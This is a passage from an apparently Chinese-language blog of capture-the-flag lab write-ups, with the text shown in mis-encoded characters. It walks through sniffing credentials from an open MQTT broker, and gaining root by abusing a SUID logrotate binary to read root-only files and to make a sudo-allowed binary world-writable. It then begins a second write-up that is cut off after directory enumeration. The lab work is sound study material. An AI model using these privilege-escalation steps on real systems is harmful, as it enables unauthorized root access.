class="number">1883</span>/tcp <span class="built_in">open</span>  mqtt</span><br><span class="line">MAC Address: C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">11.34</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æœ‰ä¸€ä¸ªå¥‡æ€ªçš„ç«¯å£mqtt</p>
<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å…ˆå»hacktricksçœ‹çœ‹æœ‰æ²¡æœ‰1883ç«¯å£mqttçš„ä»€ä¹ˆä¿¡æ¯æˆ–è€…åˆ©ç”¨æ‰‹æ®µ<br>äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªå‘å¸ƒ&#x2F;è®¢é˜…æ¶ˆæ¯ä¼ é€’åè®®<br><img src="https://pic1.imgdb.cn/item/681a265258cb8da5c8e1339c.png"><br>ç„¶åè®©gptå†™ä¸€ä¸ªå»ºè®®çš„æ¥å—ä¿¡æ¯çš„è„šæœ¬ è¿è¡Œä¹‹åå¾—åˆ°ç™»å½•å‡­è¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paho.mqtt.client <span class="keyword">as</span> mqtt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">client, userdata, message</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Topic: <span class="subst">&#123;message.topic&#125;</span>, Message: <span class="subst">&#123;message.payload.decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">client = mqtt.Client()</span><br><span class="line">client.on_message = on_message</span><br><span class="line">client.connect(<span class="string">&quot;192.168.176.228&quot;</span>, <span class="number">1883</span>, <span class="number">60</span>)</span><br><span class="line">client.subscribe(<span class="string">&quot;#&quot;</span>)</span><br><span class="line">client.loop_forever()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">python3</span> tmp.<span class="keyword">py</span> </span><br><span class="line">/root/tmp/tmp.<span class="keyword">py</span>:<span class="number">6</span>: DeprecationWarning: Callback API <span class="keyword">version</span> <span class="number">1</span> <span class="keyword">is</span> deprecated, <span class="keyword">update</span> <span class="keyword">to</span> latest <span class="keyword">version</span></span><br><span class="line">  client = mqtt.Client()</span><br><span class="line">Topic: config, Message: Topic: chat</span><br><span class="line">Topic: config, Message: config: d2VsY29tZTpmOGM1N2RmYzU4MGVhODk0YTI1M2E2ZTE2ZjMwYWMyMQ==</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">echo</span> <span class="string">&quot;d2VsY29tZTpmOGM1N2RmYzU4MGVhODk0YTI1M2E2ZTE2ZjMwYWMyMQ==&quot;</span> | base64 -d                                                  </span><br><span class="line">welcome:f8c57dfc580ea894a253a6e16f30ac21</span><br></pre></td></tr></table></figure></div>
<p><code>welcome:f8c57dfc580ea894a253a6e16f30ac21</code></p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">welcome@LingMj:~$ ls -al</span><br><span class="line">total 376</span><br><span class="line">drwx------<span class="number"> 4 </span>welcome welcome  <span class="number"> 4096 </span>Apr<span class="number"> 26 </span>23:06 .</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root    root     <span class="number"> 4096 </span>Apr<span class="number"> 11 </span>22:27 ..</span><br><span class="line">lrwxrwxrwx<span class="number"> 1 </span>root    root        <span class="number"> 9 </span>Apr<span class="number"> 26 </span>00:01 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome   <span class="number"> 220 </span>Apr<span class="number"> 11 </span>22:27 .bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome  <span class="number"> 3526 </span>Apr<span class="number"> 11 </span>22:27 .bashrc</span><br><span class="line">drwx------<span class="number"> 2 </span>welcome welcome  <span class="number"> 4096 </span>Apr<span class="number"> 26 </span>11:17 .gnupg</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>welcome welcome<span class="number"> 332111 </span>Feb <span class="number"> 9 </span>06:39 linpeas.sh</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>welcome welcome  <span class="number"> 4096 </span>Apr<span class="number"> 26 </span>23:06 .local</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome   <span class="number"> 807 </span>Apr<span class="number"> 11 </span>22:27 .profile</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome    <span class="number"> 66 </span>Apr<span class="number"> 26 </span>23:06 .selected_editor</span><br><span class="line">-rwx------<span class="number"> 1 </span>welcome welcome    <span class="number"> 24 </span>Apr<span class="number"> 25 </span>23:57 user.txt</span><br><span class="line">-rw-------<span class="number"> 1 </span>welcome welcome <span class="number"> 10527 </span>Apr<span class="number"> 26 </span>10:50 .viminfo</span><br><span class="line">welcome@LingMj:~$ sudo -l</span><br><span class="line">Matching Defaults entries for welcome on LingMj:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on LingMj:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/ash</span><br></pre></td></tr></table></figure></div>
<p>ç™»å½•åˆ°welcomeä¹‹åå‘ç°æœ‰ashçš„sudoæƒé™<br>å°è¯•è¿è¡Œä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">welcome<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/bin/ash</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># cat r</span></span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># cat root.txt</span></span><br><span class="line">wow</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥è¿è¡Œï¼Œè€Œä¸”çœ‹èµ·æ¥çœŸçš„åˆ‡æ¢åˆ°rootäº†ä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œroot flagä¸å¯¹<br>ç„¶åç”¨stringså¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªashé‡Œé¢æœ‰ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">welcome<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="variable">$ </span>strings /usr/bin/ash</span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span></span><br><span class="line">mh <span class="title class_">OG</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">readline</span><br><span class="line">rl_completion_matches</span><br><span class="line">rl_attempted_completion_over</span><br><span class="line">rl_attempted_completion_function</span><br><span class="line">rl_outstream</span><br><span class="line">using_history</span><br><span class="line">add_history</span><br><span class="line">strncmp</span><br><span class="line">puts</span><br><span class="line">putchar</span><br><span class="line">strdup</span><br><span class="line">strlen</span><br><span class="line">stderr</span><br><span class="line">__cxa_finalize</span><br><span class="line">strcmp</span><br><span class="line">__libc_start_main</span><br><span class="line">free</span><br><span class="line">libreadline.so.<span class="number">8</span></span><br><span class="line">libc.so.<span class="number">6</span></span><br><span class="line"><span class="title class_">GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">u/<span class="title class_">UH</span></span><br><span class="line">[]A\A]A^<span class="title class_">A_</span></span><br><span class="line">whoami</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">root</span><br><span class="line"><span class="title class_">This</span> is the great ta0 privilege escalation!</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="comment"># </span></span><br><span class="line">;*<span class="number">3</span><span class="variable">$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (<span class="title class_">Debian</span> <span class="number">10.2</span>.<span class="number">1</span><span class="number">-6</span>) <span class="number">10.2</span>.<span class="number">1</span> <span class="number">20210110</span></span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.<span class="number">0</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">fake.c</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥è¿™é‡Œå°±æ˜¯å†™æ­»äº†ï¼Œè¿™ä¸ªashæ˜¯ä¼ªè£…çš„ï¼Œåªç»™äº†å‡ ä¸ªç‰¹å®šçš„è¾“å…¥å’Œå¯¹åº”çš„è¾“å‡º<br>(è¿™é‡Œæˆ‘æ‹‰åˆ°æœ¬åœ°idaçœ‹äº†ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯)<br>æ‰€ä»¥æ”¾å¼ƒè¿™ä¸ªashï¼Œå¦æ±‚å‡ºè·¯ã€‚ æ‰¾ä¸€ä¸‹suidçš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">welcome<span class="variable">@LingMj</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/sbin</span><span class="regexp">/logrotate</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/screen</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/pkexec</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/libexec</span><span class="regexp">/polkit-agent-helper-1</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸åŒçš„æ˜¯logrotate<br>åœ¨gtfoargsä¸­å¯ä»¥æ‰¾åˆ°åˆ©ç”¨çš„æ–¹å¼ï¼Œè¿™é‡Œå°è¯•é‡Œé¢çš„shellå’Œcommandåˆ©ç”¨ä½†æ˜¯ä¸è¡Œ å‘ç°è¿™å¯ä»¥ç›´æ¥è¯»å–æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">welcome@LingMj:~$ /usr/sbin/logrotate /etc/passwd</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:1 unknown option &#x27;root&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:2 unknown option &#x27;daemon&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:3 unknown option &#x27;bin&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:4 unknown option &#x27;sys&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:5 unknown option &#x27;sync&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:6 unknown option &#x27;games&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:7 unknown option &#x27;man&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:8 unknown option &#x27;lp&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:10 unknown option &#x27;news&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:11 unknown option &#x27;uucp&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:12 unknown option &#x27;proxy&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:13 unknown option &#x27;www&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:14 unknown option &#x27;backup&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:15 unknown option &#x27;list&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:16 unknown option &#x27;irc&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:17 unknown option &#x27;gnats&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:18 unknown option &#x27;nobody&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:19 lines must begin with a keyword or a filename (possibly in double quotes)</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:20 unknown option &#x27;systemd&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:21 unknown option &#x27;systemd&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:22 unknown option &#x27;systemd&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:23 unknown option &#x27;systemd&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:24 unknown option &#x27;messagebus&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:25 unknown option &#x27;sshd&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:26 unknown option &#x27;welcome&#x27; -- ignoring line</span><br><span class="line"><span class="keyword">error: </span>/etc/passwd:27 unknown option &#x27;mosquitto&#x27; -- ignoring line</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯è¿™é‡Œè¯»å–çš„åªæœ‰ç¬¬ä¸€ä¸ªå•è¯<br>ç„¶ååœ¨ç»§ç»­æ‰¾ä¸€äº›æœ‰ç”¨çš„å†…å®¹ï¼Œæœ€ç»ˆåœ¨&#x2F;var&#x2F;backupsç›®å½•ä¸‹é¢å‘ç°æœ‰ä¸€ä¸ªroot.bakæ–‡ä»¶ï¼Œå°è¯•è¯»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶<br>æˆåŠŸè¯»åˆ°å†…å®¹    </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">welcome@LingMj:/var/backups$ /usr/sbin/logrotate ./root.bak </span><br><span class="line"><span class="keyword">error: </span>./root.bak:1 unknown option &#x27;naughtykid&#x27; -- ignoring line</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯rootçš„ç™»å½•å‡­è¯ï¼Œå¯ä»¥ç”¨è¿™ä¸ªç™»å½•root</p>
<p>ç¬¬äºŒç§æ–¹æ³•æ˜¯åˆ©ç”¨logrotateçš„å…¶ä»–å‚æ•° </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">welcome@LingMj:/<span class="keyword">var</span>/backups$ /usr/sbin/logrotate --<span class="keyword">help</span></span><br><span class="line">Usage: logrotate [OPTION...] &lt;configfile&gt;</span><br><span class="line">  -<span class="keyword">d</span>, --debug               Don&#x27;t <span class="keyword">do</span> anything, just <span class="keyword">test</span> and <span class="keyword">print</span> debug messages</span><br><span class="line">  -f, --force               Force <span class="keyword">file</span> rotation</span><br><span class="line">  -<span class="keyword">m</span>, --mail=command        Command to send mail (instead of `/usr/bin/mail&#x27;)</span><br><span class="line">  -s, --state=statefile     Path of state <span class="keyword">file</span></span><br><span class="line">  -v, --verbose             <span class="keyword">Display</span> messages during rotation</span><br><span class="line">  -<span class="keyword">l</span>, --<span class="keyword">log</span>=logfile         <span class="keyword">Log</span> <span class="keyword">file</span> or &#x27;syslog&#x27; to <span class="keyword">log</span> to syslog</span><br><span class="line">      --<span class="keyword">version</span>             <span class="keyword">Display</span> <span class="keyword">version</span> information</span><br><span class="line"></span><br><span class="line"><span class="keyword">Help</span> options:</span><br><span class="line">  -?, --<span class="keyword">help</span>                Show this <span class="keyword">help</span> message</span><br><span class="line">      --usage               <span class="keyword">Display</span> brief usage message</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçš„-fé€‰é¡¹æ˜¯å¼ºåˆ¶å®è¡Œæ–‡ä»¶è½¬æ¢<br>æ ¹æ®ç¾¤ä¸»çš„è§†é¢‘ï¼Œå¯ä»¥å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œè®¾ç½®ä¸€ä¸ªæ–‡ä»¶çš„æƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">welcome@LingMj:~$ cat a.conf </span><br><span class="line">/home/welcome/user.txt&#123;</span><br><span class="line">	size 1</span><br><span class="line">	create<span class="number"> 77 </span>root root </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">welcome@LingMj:~$ vi a.conf </span><br><span class="line">welcome@LingMj:~$ cat a.conf </span><br><span class="line">/home/welcome/user.txt&#123;</span><br><span class="line">	size 1</span><br><span class="line">	create<span class="number"> 777 </span>root root </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">welcome@LingMj:~$ /usr/sbin/logrotate -f a.conf</span><br><span class="line">welcome@LingMj:~$ ls -al</span><br><span class="line">total 376</span><br><span class="line">drwx------<span class="number"> 4 </span>welcome welcome  <span class="number"> 4096 </span>May <span class="number"> 6 </span>11:43 .</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root    root     <span class="number"> 4096 </span>Apr<span class="number"> 11 </span>22:27 ..</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome    <span class="number"> 58 </span>May <span class="number"> 6 </span>11:43 a.conf</span><br><span class="line">lrwxrwxrwx<span class="number"> 1 </span>root    root        <span class="number"> 9 </span>Apr<span class="number"> 26 </span>00:01 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome   <span class="number"> 220 </span>Apr<span class="number"> 11 </span>22:27 .bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome  <span class="number"> 3526 </span>Apr<span class="number"> 11 </span>22:27 .bashrc</span><br><span class="line">drwx------<span class="number"> 2 </span>welcome welcome  <span class="number"> 4096 </span>May <span class="number"> 6 </span>11:30 .gnupg</span><br><span class="line">-rwxr-xr-x<span class="number"> 1 </span>welcome welcome<span class="number"> 332111 </span>Feb <span class="number"> 9 </span>06:39 linpeas.sh</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>welcome welcome  <span class="number"> 4096 </span>Apr<span class="number"> 26 </span>23:06 .local</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome   <span class="number"> 807 </span>Apr<span class="number"> 11 </span>22:27 .profile</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>welcome welcome    <span class="number"> 66 </span>Apr<span class="number"> 26 </span>23:06 .selected_editor</span><br><span class="line">-rwxrwxrwx<span class="number"> 1 </span>root    root        <span class="number"> 0 </span>May <span class="number"> 6 </span>11:43 user.txt</span><br><span class="line">-rw-------<span class="number"> 1 </span>welcome welcome <span class="number"> 10690 </span>May <span class="number"> 6 </span>11:43 .viminfo</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°±æ˜¯å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œåˆ¶å®šè¦ä¿®æ”¹çš„æ–‡ä»¶ï¼Œç„¶åéšä¾¿è®¾ç½®ä¸€ä¸ªå¤§å°ï¼Œcreate + æƒé™ + ç”¨æˆ· + ç»„<br>è¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæƒé™777 å¹¶ä¸”æ˜¯rootçš„æ–‡ä»¶<br>è¿™æ ·å°±å¯ä»¥æŠŠä¸€ä¸ªrootæƒé™ç”¨æˆ·å†™åˆ°&#x2F;etc&#x2F;passwdæˆ–è€…ç›´æ¥æ”¹å˜&#x2F;usr&#x2F;bin&#x2F;ash å› ä¸ºè¿™ä¸ªæ–‡ä»¶æœ¬èº«æœ‰sudo</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">welcome<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="variable">$ </span>cat a.conf </span><br><span class="line">/usr/bin/ash&#123;</span><br><span class="line">	size <span class="number">1</span></span><br><span class="line">	create <span class="number">777</span> root root </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">welcome<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;bash&quot;</span> &gt; /usr/bin/ash </span><br><span class="line">welcome<span class="variable">@LingMj</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/bin/ash </span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:/home/welcome</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root<span class="variable">@LingMj</span><span class="symbol">:/home/welcome</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li>å­¦ä¹ 1883ç«¯å£mqttæœåŠ¡ï¼Œä»¥åŠç›‘å¬è„šæœ¬   </li>
<li>logrotateçš„ææƒæ–¹æ³•  1ã€‚å¯ä»¥è¯»å–æŸä¸ªæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå•è¯ 2. å¯ä»¥å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”¨åˆ›é€ å‡ºä¸€ä¸ªrootçš„777æƒé™çš„æ–‡ä»¶ ç”¨-fé€‰é¡¹å¼ºåˆ¶åŠ è½½è¿™ä¸ªé…ç½®æ–‡ä»¶</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin/ash&#123;</span><br><span class="line">	<span class="keyword">size</span> <span class="number">1</span></span><br><span class="line">	create <span class="number">777</span> root root </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>ä¸è¦è¢«ä¸€ä¸ªsudoæƒé™å¡ä½ææƒï¼Œè¯•è¯•å…¶ä»–çš„åŠæ³•ï¼Œè¿™é‡Œæ˜¯æ‰¾åˆ°äº†suidçš„logrotate</li>
<li>å­¦ä¹ å†™å…¥&#x2F;etc&#x2F;passwdçš„æ–¹æ³•ï¼Œç”¨æˆ·:å“ˆå¸Œ:ç”¨æˆ·æ ‡å·:ç»„æ ‡å·:æ³¨é‡Š:ä¸»æ–‡ä»¶å¤¹:ç”¨çš„shell</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>ç¾¤å‹é¶æœº</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾¤å‹é¶æœº-Kakeru2 wp</title>
    <url>/posts/14848.html</url>
    <content><![CDATA[<p>ç¾¤å‹é¶æœº-Kakeru2 wp</p>
<span id="more"></span>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>éå¸¸å¸¸è§„çš„æœºå™¨ ï¼Œ æˆ‘å°±å¼€æ”¾äº†80å’Œ22<br>curlä¸€ä¸‹ åœ¨é¦–é¡µæœ‰guayuç•™ä¸‹çš„ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">ä½ ä»¬çš„â€œå®‰å…¨ç³»ç»Ÿâ€ï¼Ÿä¸å ªä¸€å‡»ã€‚ ;)</span></span><br><span class="line"><span class="comment">ä¸ºäº†æ–¹ä¾¿æˆ‘ä¸‹æ¬¡â€œå›æ¥çœ‹çœ‹â€,æˆ‘ç•™ä¸‹äº†ç‚¹ä¸œè¥¿</span></span><br><span class="line"><span class="comment">-guayu</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¯´æ˜è¿™ä¸ªç³»ç»Ÿè¢«guayuæ¸—é€äº†ï¼Œå¹¶ä¸”ç•™äº†ä¸€ä¸ªåé—¨<br>æ‰«ä¸€ä¸‹ç›®å½•   å¦‚æœä½ ç”¨dirsearchç›´æ¥æ‰«ä¼šå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰<br>ç”¨gobuster æŒ‡å®šå­—å…¸ ä¼šå‘ç°æœ‰ä¸€ä¸ª403çš„secret.php ä½†æ˜¯è¿”å›é•¿åº¦å’Œå…¶ä»–çš„403ç•Œé¢ä¸åŒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://192.168.114.232/ -x php,txt,jpg,js,zip,bak </span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.114.232/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js,zip,bak</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 280]</span><br><span class="line">/secret.php           (Status: 403) [Size: 206]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

